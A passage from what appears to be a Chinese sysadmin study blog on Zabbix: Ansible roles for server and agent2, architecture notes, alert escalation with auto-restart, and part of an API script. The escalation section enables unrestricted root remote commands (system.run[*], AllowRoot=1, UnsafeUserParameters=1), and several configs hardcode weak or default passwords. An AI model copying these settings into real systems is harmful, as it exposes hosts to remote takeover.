zabbix_server.conf.j2<br>│           └── zabbix-server-ngx.conf.j2<br>└── zabbix_server.yml<br><br>29 directories, 26 files<br><br><span class="hljs-comment">#主入口playbook</span><br>[20:24:45 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> zabbix_server.yml <br>- hosts: websrvs<br>  remote_user: root<br>  roles:<br>    - nginx<br>    - php-fpm<br><br>- hosts: dbsrvs<br>  remote_user: root<br>  roles:<br>    - mysql<br><br>- hosts: websrvs<br>  remote_user: root<br>  roles:<br>    - zabbix_server<br><br><br><span class="hljs-comment">#tasks文件</span><br>[20:30:01 root@ansible-rocky zabbix_server]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_server/tasks/main.yml <br>- name: config zabbix yum repo<br>  yum_repository:<br>    name: <span class="hljs-string">&quot;ansible_zabbix&quot;</span><br>    description: <span class="hljs-string">&quot;zabbix repo&quot;</span><br>    baseurl: <span class="hljs-string">&quot;https://mirrors.aliyun.com/zabbix/zabbix/&#123;&#123; zabbix_version &#125;&#125;/rhel/&#123;&#123; ansible_distribution_major_version &#125;&#125;/&#123;&#123; ansible_architecture &#125;&#125;/&quot;</span><br>    gpgcheck: <span class="hljs-built_in">yes</span><br>    gpgkey: <span class="hljs-string">&quot;https://mirrors.aliyun.com/zabbix/zabbix-official-repo.key&quot;</span><br><br>- name: install zabbix-server<br>  yum:<br>    name: <span class="hljs-string">&quot;&#123;&#123; item &#125;&#125;&quot;</span><br>  loop:<br>    - zabbix-server-mysql<br>    - zabbix-agent2<br>    - zabbix-get<br>    - zabbix-web-mysql<br><br>- name: copy zabbix_server.conf <br>  template:<br>    src: zabbix_server.conf.j2<br>    dest: /etc/zabbix/zabbix_server.conf<br>    mode: 0600<br>  notify:<br>    - restart zabbix-server<br>  tags: restart zabbix-server<br><br>- name: <span class="hljs-built_in">chown</span>  zabbix-web<br>  file:<br>    path:  /etc/zabbix/web    <br>    state: directory<br>    owner: nginx<br>    group: nginx<br>    recurse: <span class="hljs-built_in">yes</span><br><br>- name: copy zabbix-server web conf<br>  template:<br>    src: zabbix-server-ngx.conf.j2<br>    dest: <span class="hljs-string">&quot;&#123;&#123; install_dir &#125;&#125;/conf/conf.d/zabbix_server_ngx.conf&quot;</span><br>    owner: nginx<br>    group: nginx<br>  notify:<br>    - restart nginx<br><br>- name: copy zabbix.conf into php-fpm.d<br>  template:<br>    src: zabbix.conf.j2<br>    dest: <span class="hljs-string">&quot;/etc/php-fpm.d/zabbix.conf&quot;</span><br>  notify:<br>    - restart php-fpm<br><br>- name: start zabbix-server<br>  service:<br>    name: zabbix-server<br>    state: restarted<br>    enabled: <span class="hljs-built_in">yes</span><br>    <br><span class="hljs-comment">#查看handler</span><br>[20:34:11 root@ansible-rocky zabbix_server]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_server/handlers/main.yml <br>- name: restart zabbix-server<br>  service:<br>    name: zabbix-server<br>    state: restarted<br><br>- name: restart nginx<br>  service:<br>    name: nginx<br>    state: restarted<br><br>- name: restart php-fpm<br>  service:<br>    name: php-fpm<br>    state: restarted<br>    <br><span class="hljs-comment">#查看template文件</span><br>[20:34:15 root@ansible-rocky zabbix_server]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_server/templates/zabbix.conf.j2 <br>[zabbix]<br>user = nginx<br>group = nginx<br><br>listen = /run/php-fpm/zabbix.sock<br>listen.acl_users = apache,nginx<br>listen.allowed_clients = 127.0.0.1<br><br>pm = dynamic<br>pm.max_children = 50<br>pm.start_servers = 5<br>pm.min_spare_servers = 5<br>pm.max_spare_servers = 35<br>pm.max_requests = 200<br><br>php_value[session.save_handler] = files<br>php_value[session.save_path]    = /var/lib/php/session<br><br>php_value[max_execution_time] = 300<br>php_value[memory_limit] = 128M<br>php_value[post_max_size] = 80M<br>php_value[upload_max_filesize] = 80M<br>php_value[max_input_time] = 300<br>php_value[max_input_vars] = 10000<br>php_value[date.timezone] = Asia/Shanghai<br><br>[20:38:05 root@ansible-rocky zabbix_server]$ grep -Ev <span class="hljs-string">&#x27;^$|#&#x27;</span> /opt/roles/zabbix_server/templates/zabbix_server.conf.j2 <br>LogFile=/var/log/zabbix/zabbix_server.log<br>LogFileSize=0<br>PidFile=/var/run/zabbix/zabbix_server.pid<br>SocketDir=/var/run/zabbix<br>DBHost=10.0.0.58<br>DBName=zabbix<br>DBUser=zabbix<br>DBPassword=lgq123456<br>SNMPTrapperFile=/var/log/snmptrap/snmptrap.log<br>Timeout=4<br>AlertScriptsPath=/usr/lib/zabbix/alertscripts<br>ExternalScripts=/usr/lib/zabbix/externalscripts<br>LogSlowQueries=3000<br>StatsAllowedIP=127.0.0.1<br><span class="hljs-comment">##zabbix网页配置文件</span><br>[20:39:05 root@ansible-rocky zabbix_server]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_server/templates/zabbix-server-ngx.conf.j2<br>server &#123;<br>    listen 80;<br>    server_name &#123;&#123; zabbix_fqdn &#125;&#125;;<br>    root /usr/share/zabbix;<br>    index index.php;<br>    location = /favicon.ico &#123;<br>        log_not_found   off;<br>    &#125;<br><br>    location / &#123;<br>        try_files       <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =404;<br>    &#125;<br><br>    location /assets &#123;<br>         access_log      off;<br>         expires         10d;<br>    &#125;<br><br>    location ~ /\.ht &#123;<br>         deny            all;<br>    &#125;<br><br>    location ~ /(api\/|conf[^\.]|include|locale|vendor) &#123;<br>         deny            all;<br>         <span class="hljs-built_in">return</span>          404;<br>    &#125;<br>    location ~ [^/]\.php(/|$) &#123;<br>        fastcgi_pass   127.0.0.1:9000;<br>        <span class="hljs-comment">#fastcgi_pass    unix:/run/php-fpm/zabbix.sock;</span><br>        fastcgi_split_path_info ^(.+\.php)(/.+)$;<br>        fastcgi_index   index.php;<br><br>        fastcgi_param   DOCUMENT_ROOT   /usr/share/zabbix;<br>        fastcgi_param   SCRIPT_FILENAME /usr/share/zabbix<span class="hljs-variable">$fastcgi_script_name</span>;<br>        fastcgi_param   PATH_TRANSLATED /usr/share/zabbix<span class="hljs-variable">$fastcgi_script_name</span>;<br><br>        include fastcgi_params;<br>        fastcgi_param   QUERY_STRING    <span class="hljs-variable">$query_string</span>;<br>        fastcgi_param   REQUEST_METHOD  <span class="hljs-variable">$request_method</span>;<br>        fastcgi_param   CONTENT_TYPE    <span class="hljs-variable">$content_type</span>;<br>        fastcgi_param   CONTENT_LENGTH  <span class="hljs-variable">$content_length</span>;<br><br>        fastcgi_intercept_errors        on;<br>        fastcgi_ignore_client_abort     off;<br>        fastcgi_connect_timeout         60;<br>        fastcgi_send_timeout            180;<br>        fastcgi_read_timeout            180;<br>        fastcgi_buffer_size             128k;<br>        fastcgi_buffers                 4 256k;<br>        fastcgi_busy_buffers_size       256k;<br>        fastcgi_temp_file_write_size    256k;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://img2023.cnblogs.com/blog/3077161/202301/3077161-20230110094302642-1874303812.png"><img src="3077161-20230110094302642-1874303812.png" alt="img"></a></p><h4 id="4-2-2-部署zabbix-agent"><a href="#4-2-2-部署zabbix-agent" class="headerlink" title="4.2.2 部署zabbix-agent"></a>4.2.2 部署zabbix-agent</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#目录结构</span><br>[22:59:31 root@ansible-rocky zabbix_agent2]$ tree<br>.<br>├── files<br>│   └── zabbix_agnet2.d<br>│       ├── login.conf<br>│       ├── mem.conf<br>│       ├── mysql.conf<br>│       ├── mysql_repl_status.sh<br>│       ├── mysql.sh<br>│       ├── nginx_status.conf<br>│       ├── nginx_status.sh<br>│       └── tcp_state.conf<br>├── handlers<br>│   └── main.yml<br>├── tasks<br>│   └── main.yml<br>└── templates<br>    └── zabbix_agent2.conf.j2<br><br>5 directories, 11 files<br><br><span class="hljs-comment">#task文件</span><br>[23:14:12 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_agent2/tasks/main.yml <br>- name: install repo <br>  yum_repository:<br>    name: <span class="hljs-string">&quot;ansible_zabbix&quot;</span><br>    description: <span class="hljs-string">&quot;zabbix repo&quot;</span><br>    baseurl: <span class="hljs-string">&quot;https://mirrors.aliyun.com/zabbix/zabbix/&#123;&#123; zabbix_version &#125;&#125;/rhel/&#123;&#123; ansible_distribution_major_version &#125;&#125;/&#123;&#123; ansible_architecture &#125;&#125;/&quot;</span><br>    gpgcheck: <span class="hljs-built_in">yes</span><br>    gpgkey: <span class="hljs-string">&quot;https://mirrors.aliyun.com/zabbix/zabbix-official-repo.key&quot;</span><br><br>- name: install agent2 <span class="hljs-keyword">for</span> centos or rocky<br>  yum:<br>    name: zabbix-agent2<br>  when: <br>    - ansible_distribution == <span class="hljs-string">&quot;Rocky&quot;</span> or ansible_distribution == <span class="hljs-string">&quot;Centos&quot;</span><br><br>- name: install agent2 <span class="hljs-keyword">for</span> centos or ubuntu<br>  apt:<br>    name: zabbix-agent2<br>    update_cache: <span class="hljs-built_in">yes</span><br>  when:<br>    - ansible_distribution == <span class="hljs-string">&quot;Ubuntu&quot;</span><br><br>- name: config file<br>  template:<br>    src: zabbix_agent2.conf.j2<br>    dest: <span class="hljs-string">&quot;/etc/zabbix/zabbix_agent2.conf&quot;</span><br>    mode: 0644<br>  notify:<br>    - restart zabbix-agent2<br><br>- name: copy zabbix-agent2.d content<br>  copy:<br>    src: zabbix_agent2.d<br>    dest: <span class="hljs-string">&quot;/etc/zabbix&quot;</span><br>  notify:<br>    - restart zabbix-agent2<br>  tags: zabbix_agent2.d<br><br>- name: start zabbix-agent2<br>  service:<br>    name: zabbix-agent2<br>    state: started<br>    enabled: <span class="hljs-built_in">yes</span><br>    <br><span class="hljs-comment">#handler文件</span><br>[23:14:14 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_agent2/handlers/main.yml <br>- name: restart zabbix_agent2<br>  service:<br>    name: zabbix-agent2<br>    state: restarted<br>    <br><span class="hljs-comment">#template文件</span><br>[23:14:43 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/zabbix_agent2/templates/zabbix_agent2.conf.j2 <br>PidFile=/var/run/zabbix/zabbix_agent2.pid<br>LogFile=/var/log/zabbix/zabbix_agent2.<span class="hljs-built_in">log</span><br>LogFileSize=0<br>Server=&#123;&#123; zabbix_server_ip &#125;&#125;<br>ServerActive=&#123;&#123; zabbix_server_ip &#125;&#125;<br>Hostname=&#123;&#123; ansible_default_ipv4.address &#125;&#125;<br>Include=/etc/zabbix/zabbix_agent2.d/*.conf<br>ControlSocket=/tmp/agent.sock<br></code></pre></td></tr></table></figure><h4 id="4-2-3-测试"><a href="#4-2-3-测试" class="headerlink" title="4.2.3 测试"></a>4.2.3 测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[23:15:29 root@rocky8 /etc/zabbix]$ zabbix_get -s 10.0.0.18 -k mem_use_percent<br>20.1886<br>[23:16:51 root@rocky8 /etc/zabbix]$ zabbix_get -s 10.0.0.18 -k tcp_state[ESTABLISHED]<br>32<br>[23:17:30 root@rocky8 /etc/zabbix]$ zabbix_get -s 10.0.0.28 -k tcp_state[ESTABLISHED]<br>28<br>[23:17:35 root@rocky8 /etc/zabbix]$ zabbix_get -s 10.0.0.58 -k tcp_state[ESTABLISHED]<br>55<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第十周</title>
    <link href="/2023/07/28/%E7%AC%AC%E5%8D%81%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E5%8D%81%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="1、zabbix-架构原理，及常用组件及用途分析"><a href="#1、zabbix-架构原理，及常用组件及用途分析" class="headerlink" title="1、zabbix 架构原理，及常用组件及用途分析"></a>1、zabbix 架构原理，及常用组件及用途分析</h3><p>1.1、zabbix架构图</p><p><img src="zabbix-%E6%9E%B6%E6%9E%84-scaled.jpeg" alt="img"></p><p>1.2、常用组件及用途</p><figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros">架构<br>Zabbix 由几个主要的功能组件组成，其职责如下所示。<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">Server</span><br><span class="hljs-built_in"></span>Zabbix<span class="hljs-built_in"> server </span>是 Zabbix agent 向其报告可用性、系统完整性信息和统计信息的核心组件。是存储所有配置信息、统计信息和操作信息的核心存储库。<br><br>数据库<br>所有配置信息以及 Zabbix 收集到的数据都被存储在数据库中。<br><br>Web 界面<br>为了从任何地方和任何平台轻松访问 Zabbix ，我们提供了基于 web 的界面。该界面是 Zabbix<span class="hljs-built_in"> server </span>的一部分，通常（但不一定）和 Zabbix<span class="hljs-built_in"> server </span>运行在同一台物理机器上。<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">Proxy</span><br><span class="hljs-built_in"></span>Zabbix<span class="hljs-built_in"> proxy </span>可以替 Zabbix<span class="hljs-built_in"> server </span>收集性能和可用性数据。Zabbix<span class="hljs-built_in"> proxy </span>是 Zabbix 环境部署的可选部分；然而，它对于单个 Zabbix<span class="hljs-built_in"> server </span>负载的分担是非常有益的。<br><br>Agent<br>Zabbix agents 部署在被监控目标上，用于主动监控本地资源和应用程序，并将收集的数据发送给 Zabbix server。<br></code></pre></td></tr></table></figure><h3 id="2、监控LNMP架构，并配置报警升级，0-5分钟不报警执行重启应用，5-30分钟通知运维，30-60分钟短信通过总监。"><a href="#2、监控LNMP架构，并配置报警升级，0-5分钟不报警执行重启应用，5-30分钟通知运维，30-60分钟短信通过总监。" class="headerlink" title="2、监控LNMP架构，并配置报警升级，0-5分钟不报警执行重启应用，5-30分钟通知运维，30-60分钟短信通过总监。"></a>2、监控LNMP架构，并配置报警升级，0-5分钟不报警执行重启应用，5-30分钟通知运维，30-60分钟短信通过总监。</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs awk">环境：<br>zabbix_server:<span class="hljs-number">10.0</span>.<span class="hljs-number">0.129</span><br>zabbix_agent:<span class="hljs-number">10.0</span>.<span class="hljs-number">0.135</span><br><br><span class="hljs-number">1</span>）安装server和关联agent就不多讲了，主要是准备agent的LNMP环境，<br>nginx一键编译安装，之前的文章里有脚本。最后的配置文件代理PHP页面即可<br>cat <span class="hljs-regexp">/apps/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>    server &#123;<br>        listen       <span class="hljs-number">80</span>; <br>        server_name  localhost;<br>            root <span class="hljs-regexp">/data/</span>nginx/wordpress;<br>        index index.php;<br>            server_tokens off;<br>        location / &#123; <br>                    client_max_body_size <span class="hljs-number">2000</span>M;<br>                    <span class="hljs-comment">#client_body_buffer_size 1024k;</span><br>                    <span class="hljs-comment">#client_body_temp_path /apps/nginx/client_body_temp/ 1 2 2;</span><br>            root <span class="hljs-regexp">/data/</span>nginx/wordpress; <span class="hljs-comment">#指定数据目录</span><br>            index index.php index.html index.htm; <span class="hljs-comment">#指定默认主页</span><br>                    try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span><span class="hljs-regexp">/ /i</span>ndex.php?<span class="hljs-variable">$args</span>;<br>        &#125;   <br><br>        location ~ \.php$ &#123;<br>            root           <span class="hljs-regexp">/data/</span>nginx/wordpress;<br>            fastcgi_pass   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>            fastcgi_index  index.php;<br>            fastcgi_param  SCRIPT_FILENAME  <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>            include        fastcgi_params;<br>        &#125;   <br>        location ~ ^/(ping|pm_status)$ &#123; <span class="hljs-comment">#实现状态页</span><br>                include fastcgi_params;<br>                fastcgi_pass <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>                fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>                <span class="hljs-comment">#fastcgi_param PATH_TRANSLATED $document_root$fastcgi_script_name; 此配置也可以</span><br>        &#125;   <br><span class="hljs-number">2</span>）安装php环境，这里有坑，准备的干净主机想编译安装php74，花了几个小时，一直有依赖错误，解决不了。。。干脆yum安装，实现功能即可。<br><br><span class="hljs-comment">#安装源</span><br>yum install epel-release<br>yum install http:<span class="hljs-regexp">//</span>rpms.remirepo.net<span class="hljs-regexp">/enterprise/</span>remi-release-<span class="hljs-number">7</span>.rpm<br><span class="hljs-comment">#安装php和依赖</span><br>yum install php74-php-gd php74-php-pdo php74-php-mbstring php74-php-cli php74-php-fpm php74-php-mysqlnd<br><span class="hljs-comment">#修改配置文件</span><br>grep <span class="hljs-string">&#x27;^[a-Z]&#x27;</span> <span class="hljs-regexp">/etc/</span>php-fpm.d/www.conf.rpmsave <br>listen = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span><br>user = apache<br>group = apache<br>pm = dynamic<br>pm.max_children = <span class="hljs-number">50</span><br>pm.start_servers = <span class="hljs-number">5</span><br>pm.min_spare_servers = <span class="hljs-number">5</span><br>pm.max_spare_servers = <span class="hljs-number">35</span><br>slowlog = <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/php-fpm/</span>www-slow.log<br>php_admin_value[error_log] = <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/php-fpm/</span>www-error.log<br>php_admin_flag[log_errors] = on<br>php_value[session.save_handler] = files<br>php_value[session.save_path] = <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>session<br><span class="hljs-comment">#启动服务</span><br>systemctl start php74-php-fpm<br><br><span class="hljs-number">3</span>）创建数据库授权即可，使用mariadb和msyql都可以<br>create database wordpress; <span class="hljs-comment">#创建数据库</span><br>create user wordpress@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>; <span class="hljs-comment">#创建用户和密码</span><br>grant all on wordpress.* to wordpress@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>; <span class="hljs-comment">#授权从10.0.0.%段访问wordpress都可以</span><br>flush privileges; <span class="hljs-comment">#刷新权限</span><br><span class="hljs-number">4</span>）结果<br><br><br><br><span class="hljs-number">5</span>）这里先对端口做监控，查看服务是否正常<br><br><span class="hljs-number">6</span>）要想远程执行命令必须在zabbix_agent开启执行命令的配置，不然无法执行。<br><br>AllowKey=system.run[*] <span class="hljs-comment">#zabbix5.0版本以上,代替EnableRemoteCommands,agent2默认没有此命令手工加入</span><br> <span class="hljs-comment">#EnableRemoteCommands=1 #开启远程执行命令,此指令在zabbix5.0版本以上淘汰</span><br>AllowRoot=<span class="hljs-number">1</span>  <span class="hljs-comment">#开启此项,直接使用root进行远程管理,而无须对zabbix用户授权sudo权限</span><br>UnsafeUserParameters=<span class="hljs-number">1</span>  <span class="hljs-comment">#允许远程执行命令的时候使用不安全的参数(特殊字符串,如: \ &#x27; * ? [] &#123;&#125; ~ $ ! &amp; ; ( ) &lt; &gt; 等 )</span><br><br><span class="hljs-number">7</span>）创建<span class="hljs-number">80</span>端口的触发器，<span class="hljs-number">3306</span>端口克隆即可<br><br><br><br><span class="hljs-number">8</span>）创建动作<br><br><br><br><br><span class="hljs-number">9</span>）最终结果<br><br><br><br><br><span class="hljs-comment">###动作日志</span><br></code></pre></td></tr></table></figure><h3 id="3、zabbix-api批量添加多个主机，要求一些不走代理，一些支持走代理"><a href="#3、zabbix-api批量添加多个主机，要求一些不走代理，一些支持走代理" class="headerlink" title="3、zabbix api批量添加多个主机，要求一些不走代理，一些支持走代理"></a>3、zabbix api批量添加多个主机，要求一些不走代理，一些支持走代理</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">环境：<br>zabbix_server：10.0.0.129<br>zabbix_proxy：10.0.0.130<br>zabbix_agent-active：10.0.0.128<br>zabbix_agent-passive：10.0.0.138<br>1）要想通过API批量添加主机，前提是主机上已经安装了zabbix_agent，并且已经对配置文件进行修改，安装这里就不讲了，官网文档都有。直接上干货<br>2）代理agent的配置文件：<br>[root@rocky5 ~]<span class="hljs-comment">#grep &#x27;^[a-Z]&#x27; /etc/zabbix/zabbix_agent2.conf </span><br>PidFile=<span class="hljs-string">/var/run/zabbix/zabbix_agent2.pid</span><br>LogFile=<span class="hljs-string">/var/log/zabbix/zabbix_agent2.log</span><br>LogFileSize=0<br>Server=10.0.0.130<br>ServerActive=10.0.0.130<br>Hostname=10.0.0.128 <br>Include=<span class="hljs-string">/etc/zabbix/zabbix_agent2.d/</span>*<span class="hljs-string">.conf</span><br>ControlSocket=<span class="hljs-string">/tmp/agent.sock</span><br>3）无代理的agent配置文件<br>[root@rocky ~]<span class="hljs-comment">#grep &#x27;^[a-Z]&#x27; /etc/zabbix/zabbix_agentd.conf    </span><br>PidFile=<span class="hljs-string">/var/run/zabbix/zabbix_agentd.pid</span><br>LogFile=<span class="hljs-string">/var/log/zabbix/zabbix_agentd.log</span><br>LogFileSize=0<br>Server=10.0.0.129<br>ListenPort=10050<br>ServerActive=127.0.0.1<br>Hostname=10.0.0.138<br>Include=<span class="hljs-string">/etc/zabbix/zabbix_agentd.d/</span>*<span class="hljs-string">.conf</span><br>4）准备获取zabbix_server的token脚本<br>cat <span class="hljs-string">/data/sh/zabbix_api-token.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ZABBIX_SERVER=10.0.0.129<br>curl -s -XPOST -H <span class="hljs-string">&quot;Content-Type: application/json-rpc&quot;</span> -d &#x27;                    <br>                     <br>&#123;<br><span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br><span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;user.login&quot;</span>,<br><span class="hljs-string">&quot;params&quot;</span>: &#123;<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;Admin&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;zabbix&quot;</span><br>&#125;,<br><span class="hljs-string">&quot;id&quot;</span>: 1,<br><span class="hljs-string">&quot;auth&quot;</span>: 